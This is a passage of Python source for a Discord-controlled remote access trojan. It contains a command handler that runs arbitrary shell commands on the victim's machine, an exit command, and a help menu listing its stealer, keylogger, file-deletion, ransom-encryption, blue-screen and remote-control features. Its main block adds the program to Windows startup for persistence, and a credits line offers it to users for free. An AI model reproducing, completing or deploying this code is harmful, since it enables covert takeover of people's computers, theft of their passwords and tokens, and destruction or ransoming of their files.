async def list_files(ctx, directory: str = "."):
    try:
        files = os.listdir(directory)

        embed = discord.Embed(
            title=f"Files in {directory}",
            color=discord.Color.blue()
        )

        file_list = []
        for file in files[:20]: 
            file_path = os.path.join(directory, file)
            if os.path.isdir(file_path):
                file_list.append(f"**{file}/**")
            else:
                file_list.append(f"**{file}**")

        embed.description = "\n".join(file_list)
        if len(files) > 20:
            embed.set_footer(text=f"And {len(files) - 20} more files...")

        await ctx.send(embed=embed)
    except Exception as e:
        await send_embed(ctx, "List Files Error", f"Failed to list files: {str(e)}", discord.Color.red())

@bot.command(name='cmd')
@is_authorized()
async def run_cmd(ctx, *, command: str):
    try:
        await send_embed(ctx, "Command Executing", f"Running command: **{command}**", discord.Color.dark_grey())
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        if len(output) > 1900:
            output = output[:1900] + "..."
        
        embed = discord.Embed(
            title="Command Output",
            description=f"```\n{output}\n```",
            color=discord.Color.dark_grey()
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await send_embed(ctx, "Command Error", f"Failed to run command: {str(e)}", discord.Color.red())

@bot.command(name='exit')
@is_authorized()
async def exit_bot(ctx):
    try:
        embed = discord.Embed(
            title="Exiting",
            description=f"Goodbye!",
            color=discord.Color.dark_grey()
        )
        await ctx.send(embed=embed)

        time.sleep(1)

        sys.exit(0)
    except Exception as e:
        await send_embed(ctx, "Command Error", f"Failed to run command: {str(e)}", discord.Color.red())

@bot.command(name='help')
async def rat_help(ctx):
    embed = discord.Embed(
        title="Commands",
        description="A list of commands you can run to control the target PC.",
        color=discord.Color.purple()
    )

    categories = {
        "Config": [
            f"**Prefix:** `{Config.PREFIX}`",
            f"**Whitelisted:** <@{Config.WHITELISTED[0]}>", # Fixed index
            f"**Main Channel:** <#{Config.MAIN_CHANNEL}>"
        ],
        "System Info": [
            "`info` - Get advanced system information",
        ],
        "Stealer": [
            "`steal` - Steal browser data, passwords, tokens",
            "`keylog` - Send recorded keystrokes",
        ],
        "Destructive": [
            "`lock` - Locks PC",
            "`crash` - Blue screens PC",
            "`filescramble` - Renames all files randomly",
            "`filedestroy` - Deletes all personal files",
            "`fileransom` - Encrypts all files",
            "`virus` - Fake virus messages",
        ],
        "Messages": [
            "`voice [message]` - Text-to-speech message",
            "`msgbox [message]` - Message box popup",
            "`rickroll` - Opens Rickroll video",
        ],
        "Control": [
            "`screenshot [name]` - Take screenshot",
            "`open <app>` - Open application",
            "`close <app>` - Close application",
            "`listapps [limit]` - List running apps",
            "`cmd [command]` - Run a cmd command"
        ],
        "Mouse & Keyboard": [
            "`click [left|right|middle]` - Mouse click",
            "`press <keys>` - Press keys (ex: ctrl+c)"
        ],
        "Power Control": [
            "`shutdown [delay]` - Shutdown PC",
            "`restart [delay]` - Restart PC",
        ],
        "Media": [
            "`playpause` - Play/Pause media",
            "`nexttrack` - Next track"
        ],
        "Files": [
            "`listfiles [directory]` - List files"
        ],
        "Bot": [
            "`exit` - Closes the rat and exits."
        ],
        "Credits": [
            "-# Thanks to [Vn](<https://discord.com/users/1421939463164133590>), this product is brought to you for free!"
        ]
    }

    for category, commands_list in categories.items():
        embed.add_field(
            name=category,
            value="\n".join(commands_list),
            inline=False
        )

    await ctx.send(embed=embed)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        embed = discord.Embed(
            title="Command Not Found",
            description=f"Use `{Config.PREFIX}help` for available commands.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
    elif isinstance(error, commands.CheckFailure):
        pass 
    else:
        embed = discord.Embed(
            title="An Error Occurred",
            description=f"```{str(error)}```",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

if __name__ == "__main__":
    if platform.system() == "Windows":
        if Config.STARTUP:
            add_to_startup()
        
        bot.run(Config.TOKEN)
